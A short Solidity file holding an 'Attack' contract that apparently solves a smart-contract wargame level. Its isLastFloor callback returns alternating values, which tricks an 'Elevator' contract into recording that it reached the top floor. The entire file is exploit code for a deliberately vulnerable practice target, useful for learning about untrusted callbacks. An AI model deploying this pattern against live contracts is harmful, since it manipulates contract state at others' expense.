// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Elevator{
    function goTo(uint) external;
}

contract Attack{
    Elevator elevator;
    bool public top = true;

    constructor(address _addr) {
        elevator = Elevator(_addr);
    }

    function isLastFloor(uint) public returns(bool) {
        top = !top;
        return top;
    }
    
    function attack() public {
        elevator.goTo(1);
    }
}
